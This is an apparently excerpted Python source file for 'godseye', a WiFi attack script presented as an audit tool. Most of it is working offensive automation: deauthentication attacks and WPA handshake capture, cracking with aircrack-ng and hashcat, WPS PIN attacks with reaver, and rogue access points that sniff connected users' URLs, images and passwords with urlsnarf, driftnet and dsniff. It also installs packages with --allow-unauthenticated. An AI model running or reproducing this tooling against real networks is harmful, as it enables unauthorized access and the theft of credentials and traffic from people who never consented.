#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   godseye- A script to conduct  WiFi audits with ease.
...
scriptVersion = "1.1_build_date_29/07/2021"
...
dependenciesInstalled = lambda : '{}Not installed{}'.format(col.fail,col.endl) if bashReturnValue("ls -l ~/.godseye/air/aircrack-ng/src/aircrack-ng ~/.godseye/wps/reaver/src/reaver >/dev/null 2>/dev/null && ls ~/.godseye/magic/pixiewps/src/pixiewps 2>/dev/null || ls ~/.godseye/magic/*/pixiewps") != '0' else '{}Installed{}'.format(col.okg,col.endl)
#The GPLv3+ exclusion of warranty. Just in case.
def displayWarranty():
    print("    %sgodseye Copyright (C) 2021 ANJEESHNU" %(col.fail,col.endl))
...
class functions:
    ...
    def getAvailableWifiCards():
        ...
        for i in range(1,int(cardRange)+1):
            ...
            cardArray.append(i)
            getCardChipset = ioStream("~/.godseye/air/*/scripts/airmon-ng | grep %s | awk -F ' ' {'print $4,$5,$6,$7,$8,$9,$10'}" %(wirelessCards[i-1]))
    ...
    def gitDeps():
        if bashReturnValue("ls ~/.godseye/air/aircrack-ng/src/aircrack-ng ~/.godseye/wps/reaver/src/reaver >/dev/null 2>/dev/null && ls ~/.godseye/magic/pixiewps/src/pixiewps 2>/dev/null || ls ~/.godseye/magic/pixiewps/pixiewps") != '0':
        ...
        if bashReturnValue("ls ~/.godseye/air/*/src/aircrack-ng ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.godseye/air/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.godseye/air && cd ~/.godseye/air && apt update --allow-unauthenticated && apt install git git-core libnl-3-dev openssl libnl*-gen* libgcrypt20-dev build-essential libssl-dev -y --allow-unauthenticated && git clone git://git.kali.org/packages/aircrack-ng.git -b upstream && cd * && make gcrypt=true")
                bashRun("chmod +x ~/.godseye/air/*/scripts/airmon-ng")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        if bashReturnValue("ls ~/.godseye/wps/*/src/reaver ") != '0':
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.godseye/wps/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.godseye/wps && cd ~/.airscriptNG/wps && apt update --allow-unauthenticated && apt install libpcap-dev build-essential -y --allow-unauthenticated && git clone git://git.kali.org/packages/reaver.git -b upstream && cd */src && ./configure && make")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        if bashReturnValue("ls ~/.godseye/magic/*/src/pixiewps ") != '0' and bashReturnValue("ls ~/.godseye/magic/*/pixiewps") != "0":
            if bashReturnValue('/usr/bin/env ping -c1 8.8.8.8 ') == '0':
                bashRun("rm ~/.airscriptNG/magic/ -r 2>/dev/null")
                bashRun("mkdir -p ~/.godseye/magic && cd ~/.godseye/magic && apt update --allow-unauthenticated && apt install libssl-dev build-essential -y --allow-unauthenticated && git clone git://git.kali.org/packages/pixiewps.git -b upstream && cd */src/ && make || cd ../ && make && make install")
            else:
                print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
                os._exit(1)
        #Check if airmon-ng from the git repo is executable, and if not, assign execute permissions to it.
        if bashReturnValue("~/.godseye/air/*/scripts/airmon-ng") != '0':
            bashRun('chmod +x ~/.godseye/air/*/scripts/airmon-ng &>/dev/null')
    ...
    def depandancies(): 
        ...
        if bashReturnValue("/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null") == '0':
            ...
            subprocess.call("xterm $HOLD -title 'Installing any dependencies [godseye]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 gnome-terminal hostapd psmisc coreutils -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable'",shell=True)
        else:
        ...
        while True:
            try:
                ...
                if waitForUser.lower().startswith("clear"):
                    ...
                    bashRun("sudo systemctl start wpa_supplicant.service")
                    clearTerm()
                    print("\n[%s+%s]Cleared any residual files from /root/.godseye and ./HANDSHAKES" %(col.okg,col.endl))
                    print("\n[%s+%s]Done Cleanup.\n" %(col.okg,col.endl))
                    break
            except(KeyboardInterrupt,EOFError):
                continue
...
class main:
        ...
        try:
            ...
            if userConfirmation.lower().startswith("y"):
                ...
                if subnet.lower().startswith("n"):
                    ...
                    pass
                if bashRun("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY godseye' >/dev/null 2>/dev/null") != 0:
                    bashRun("echo '#BY godseye' >> /etc/dhcp/dhcpd.conf")
                ...
                if apStartFinalConfirmation.lower().startswith("y"):
                    ...
                    if apHostMethod == "AIRBASE-NG":
                        def hostApWithAirbaseNg():
                            bashRun("rm ~/.godseye/traffic-sniff.sh 2>/dev/null")
                            if bashRun("ls ~/.godseye/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                                bashRun("mkdir ~/.godseye/ >/dev/null 2>/dev/null; touch ~/.godseye/traffic-sniff.sh ; cd ~/.godseye/;chmod +x traffic-sniff.sh")
                                bashRun("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.godseye/traffic-sniff.sh " %(airbase,airbase,airbase))
                                bashRun("echo 'sleep 3' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.godseye/traffic-sniff.sh" %(subnet2,apAddr))
                                bashRun("echo 'dhcpd at0' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --flush' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --flush' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --delete-chain' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --delete-chain' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.godseye/traffic-sniff.sh" %(inetface))
                                bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.godseye/traffic-sniff.sh")
                        hostApWithAirbaseNg()
                        if firstVariable != "" and secondVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelNumber,airbase))
                        if firstVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelNumber,airbase))
                        if secondVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelNumber,airbase))
                    #END HERE
                    #START THE NEXT ONE HERE
                        ...
                        def hostApWithHostapd():
                            ...
                            if bashRun("ls ~/.godseye/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                                bashRun("mkdir ~/.godseye/ >/dev/null 2>/dev/null; touch ~/.godseye/traffic-sniff.sh ; cd ~/.godseye/;chmod +x traffic-sniff.sh")
                                bashRun("echo 'sleep 3' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'ifconfig %s 192.168.%s.%s netmask 255.255.255.0' >> ~/.godseye/traffic-sniff.sh" %(airbase,subnet2,apAddr))
                                ...
                                bashRun("echo 'iptables --table nat --delete-chain' >> ~/.godseye/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.godseye/traffic-sniff.sh" %(inetface))
                                bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface %s' >> ~/.godseye/traffic-sniff.sh" %(airbase))
                                bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.godseye/traffic-sniff.sh")
                        hostApWithHostapd()
                        check_for_hostapd = bashReturnValue("ls ~/.godseye/hostapd.conf ")
                        if check_for_hostapd == '0':
                            bashRun("rm ~/.godseye/hostapd.conf >/dev/null 2>/dev/null")
                        bashRun("touch ~/.godseye/hostapd.conf")
                        bashRun("echo 'interface=%s' >> ~/.godseye/hostapd.conf" %(airbase))
                        bashRun("echo 'driver=nl80211' >> ~/.godseye/hostapd.conf")
                        bashRun("echo 'ssid=%s' >> ~/.godseye/hostapd.conf" %(ssid))
                        bashRun("echo 'channel=%s' >> ~/.godseye/hostapd.conf" %(channelNumber))
                        bashRun("killall hostapd 2>/dev/null")
                        bashRun("nmcli dev set %s managed no" %(airbase))
                        if firstVariable != "" and secondVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.godseye/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' " %(airbase,airbase,airbase))
                        if firstVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.godseye/hostapd.conf' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                        if secondVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.godseye/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.godseye/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                    #END HERE FOR HOSTAPD
                    def runOnExit():
                        if bashReturnValue("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY godseye' ") == '0':
    ...
    def crackCaptureFile():
        ...
        try:
            ...
            if chooseCpuOrGpu == "1": #CPU CRACK SECTION
                ...
                try:
                    bashRun("godseye %s -w %s" %(cpucrack,wordcrack))
                except(KeyboardInterrupt,EOFError):
                    bashRun("kill $(ps aux | grep -i \"godseye\" | awk -F ' ' {'print $2'}) 2>/dev/null")
                        ...
                        if wordlistTypeChoice == "1":
                            ...
                            while True:
                                ...
                                if gpuTemperatureRetain <= 80 and gpuMaximumTemperature <= 85:
                                    ...
                                    continue
                            optionDisplayMenu()
                            if bashReturnValue("ls ~/.godseye/ ") != '0':
                                bashRun("mkdir ~/.godseye/ 2>/dev/null")
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                if bashReturnValue("ls ~/.godseye/HANDSHAKEFILE ") != '0':
                                    bashRun("touch ~/.godseye/HANDSHAKEFILE")
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.godseye/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.godseye/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,mainWordList,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.godseye/HANDSHAKEFILE 2>/dev/null")
                                bashRun("rm -r ~/.godseye/Dependencies-for-godseye/ 2>/dev/null")
                            ...
                            if bashReturnValue("ls ~/.airscriptNG/ ") != '0':
                                bashRun("mkdir ~/.godseye/ 2>/dev/null")
                            if bashReturnValue("ls ~/.godseye/Dependencies-for-godseye/router-keyspaces.txt ") != '0':
                                bashRun("cd ~/.godseye/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                            while True:
                                clearTerm()
                                ...
                                if hashcatBruteForceOptions == "2":
                                    bashRun("cat ~/.godseye/Dependencies-for-godseye/router-keyspaces.txt | less")
                                    continue
                            while True:
                                bashRun("clear")
                                print("""
        ...
        """)
                            ...
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                if bashReturnValue("ls ~/.godseye/HANDSHAKEFILE ") != '0':
                                    bashRun("touch ~/.godseye/HANDSHAKEFILE")
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.godseye/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 3 -m 2500 ~/.godseye/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,hashcatBruteForceMask,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.godseye/HANDSHAKEFILE 2>/dev/null")
                                bashRun("rm -r ~/.godseye/Dependencies-for-godseye/ 2>/dev/null")
                                bashRun("rm %s/hashcat.potfile %s/hashcat.log" %(hashcatDirectoryPath,hashcatDirectoryPath))
                                functions.menuOrExit()
                            ...
                            while True:
                                ...
                                if bashReturnValue("ls ~/.godseye/Wordlists/ ") != '0':
                                        bashRun("mkdir ~/.godseye/Wordlists/")
                                if hardcodedWordlistChoice == "1":
                                    if bashReturnValue("ls ~/.godseye/Wordlists/rockyou.txt.bz2 ~/.godseye/Wordlists/rockyou.txt ") != '0':
                                        bashRun("cd ~/.godseye/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 && bzip2 -d rockyou.txt.bz2")
                                    hardcodedWordlistPath = "~/.godseye/Wordlists/rockyou.txt"
                                    break
                                elif hardcodedWordlistChoice == "2":
                                    if bashReturnValue("ls ~/.godseye/Wordlists/phpbb.txt.bz2 ~/.godseye/Wordlists/phpbb.txt ") != '0':
                                        bashRun("cd ~/.godseye/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 && bzip2 -d phpbb.txt.bz2")
                                    hardcodedWordlistPath = "~/.godseye/Wordlists/phpbb.txt"
                                    break
                                elif hardcodedWordlistChoice == "3":
                                    if bashReturnValue("ls ~/.godseye/Dependencies-for-godseye/ ") != '0':
                                        bashRun("cd ~/.godseye/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                                    hardcodedWordlistPath = "~/.godseye/Dependencies-for-godseye/Small-wpa-list"
                                    break
                                else:
                                    continue
                            ...
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                ...
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.godseye/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.godseye/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,mainWordList,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.godseye/HANDSHAKEFILE 2>/dev/null")
                                bashRun("cd ~/.godseye/Dependencies-for-godseye-ng/ && git stash && git pull >/dev/null 2>/dev/null")
                                bashRun("rm %s/hashcat.potfile %s/hashcat.log" %(hashcatDirectoryPath,hashcatDirectoryPath))
                                functions.menuOrExit()
                            optionDisplayMenu()
        ...
        def revertBashAlias():
            ...
            while True:
                ...
                if revertAlias.lower().startswith("n"):
                    ...
                    if bashReturnValue("ls ~/.godseye/bash_backup/bashrc-* ") == '0':
                        clearTerm()
                        print("\n")
                        bashRun("echo Bash_Aliases file found from $(ls ~/.godseye/bash_backup/ | sort | awk -F '-' {'print $2'})")
                        if input("Restore? [y/n] >>").lower().startswith("y"):
                            print("\n[%s+%s]Restoring bash resource!" %(col.okg,col.endl))
                            if bashReturnValue("cp ~/.godseye/bash_backup/bashrc-* ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" && /bin/bash -c \"source ~/.bash_aliases\" ") == '0':
                        ...
                        def noBackupFile():
                            ...
                            print("[%si%s]Just close your terminal and re-open it. The 'godseye' command should disappear.\n" %(col.okb,col.endl))
                            functions.menuOrExit()
                        noBackupFile()
        revertBashAlias()
    ...
    def createAlias():
        ...
        if input("\033[1;37;48m\n\nAdd godseye commands to system? (append alias to ~/.bash_aliases)? %s[y/n]%s >" %(col.head_deep,col.endl)).lower().startswith("y") and bashReturnValue("cat ~/.bash_aliases 2>/dev/null | grep \"godseye\" ") != '0':
            if bashReturnValue("ls .godseye/bash_backup/ ") != '0':
                if bashReturnValue("mkdir -p ~/.godseye/bash_backup/ ") == '0':
                    if bashReturnValue("ls ~/.bash_aliases ") == '0':
                        if bashReturnValue("ls ~/.godseye/bash_backup/bashrc-* ") != '0':
                            bashRun("cp ~/.bash_aliases ~/.godseye/bash_backup/bashrc-$(date | awk -F ' ' {'print $1,$2,$3,$6'} | tr -d '[:space:]' | sort) 2>/dev/null ")
            while True:
                ...
                if userDirectoryChoice.lower().startswith('y'):
                    ...
                    print("\033[1;34;48m\n\nPlease choose location of where you have the godseye.py file. ")
            ...
            scriptInstallLocation = ("echo alias godseye=\'%s\' >> ~/.bash_aliases" %(scriptLocation))
            ...
            print("Invoke this script from anywhere by typing \"godseye\" as the root user.\n")
            os._exit(0)
        elif bashReturnValue("cat ~/.bash_aliases | grep \"godseye\" ") == '0':
    ...
    \033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2021. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
                ...
                try:
                    bashRun("/usr/bin/env bash -c 'nohup ~/.godseye/air/*/src/airodump-ng -a --wps -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s &>/dev/null &'" %(tempPath,index))
                    bashRun("~/.godseye/wps/*/src/wash -i %s | tee -a %s" %(index,dumpPath))
                except(KeyboardInterrupt,EOFError):
                ...
                def fix():
                    ...
                    if opt == "1":
                        bashRun("~/.godseye/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                        print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/godseye approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                        functions.cleanupScript(index)
                    if opt == "2":
                        bashRun("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e ~/.godseye/air/*/src/aireplay-ng -1 30 -a %s %s & ~/.godseye/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
    ...
    \033[1;33;48m[info] \033[1;32;48mDeveloped by Sh3llCod3, Using the Aircrack-ng tool. 2017-2021. Use with legal caution, disclaimer applies.\033[1;39;48m                                                                                  
        """)
                    if bashReturnValue("ls -l HANDSHAKES/ ") != '0':
                        bashRun("mkdir HANDSHAKES")
                    ...
                    try:
                        bashRun("~/.godseye/air/*/src/airodump-ng -a -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s" %(temp_path,index))
                    except(KeyboardInterrupt,EOFError):
                    ...
                    if b and c and d != "":
                        ...
                        def crackCapturedHandshake():
                            ...
                            try:
                                bashRun("~/.godseye/air/*/src/aircrack-ng %s-01.cap -w %s" %(b,f))
                                functions.cleanupScript(index)
                            except(KeyboardInterrupt,EOFError):
                                print("%s\n^Recieved KeyboardInterrupt/EOF. Cancelling...%s" %(col.fail_deep,col.endl))
                                bashRun('killall godseye 2>/dev/null')
                        ...
                        def standard():
                            ...
                            bashRun("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.godseye/air/*/src/aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && ~/.godseye/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                        ...
                        def broadcast_deauth():
                            ...
                            bashRun("iwconfig %s channel %s" %(index,c))
                            bashRun("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.godseye/air/*/src/aireplay-ng -0 %s -a %s %s --ignore-negative-one && ~/.godseye/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                            crackCapturedHandshake()
                        def no_deauth():
                            clearTerm()
                            ...
                            bashRun("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e '~/.godseye/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                            crackCapturedHandshake()
                        def sta():
                            bashRun("gnome-terminal --command='bash -c \"~/.godseye/air/*/src/airodump-ng --bssid %s -c %s --ignore-negative-one %s\"' 2>/dev/null &" %(d,c,index))
                            global g
...
def mainMenu():
    try:
        ...
        menuTextItemArray = \
    [[col.head_deep,' to crack WPA/WPA2','1','main.aircrackng'],
    [col.blue_deep,'  to crack WPS (rare vulnerability)','2','main.reaver'],
